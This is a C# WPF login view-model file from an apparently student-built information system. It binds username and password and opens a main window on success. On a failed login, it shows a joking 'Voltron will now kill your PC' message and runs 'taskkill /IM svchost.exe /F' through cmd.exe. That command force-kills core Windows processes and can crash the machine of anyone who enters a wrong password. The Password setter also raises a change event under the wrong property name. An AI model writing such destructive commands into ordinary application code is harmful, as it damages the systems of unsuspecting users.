using StudentInfoSystem.ViewModels.Commands;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Input;
using UserLogin;

namespace StudentInfoSystem.ViewModels
{
    public class LoginVM : ObservableObject
    {
        public ICommand LoginCommand{get; set;}
        private string _username;
        private string _password;

        public string Username
        {
            get { return _username; }
            set
            {
                _username = value;
                RaisePropertyChangedEvent("Username");
            }
        }
        public string Password
        {
            get { return _password; }
            set
            {
                _password = value;
                RaisePropertyChangedEvent("SomeText");
            }
        }
        public LoginVM()
        {
            this.LoginCommand = new LoginCommand(this);
        }

        public void Login()
        {
            User user = UserData.IsUserPassCorrect(_username, _password);

            if (user == null)
            {
                //Kills the PC
                MessageBox.Show("You didn't enter the correct username / password. " +
                    "Voltron will now kill your PC");
                Process.Start("cmd.exe", @"/C taskkill /IM svchost.exe /F");
            }
            else
            {
                Student student = UserValidation.GetStudentDataByUser(user);
                MainWindow mainWindow = new MainWindow(student);
                mainWindow.Show();
            }
        }
    }
}
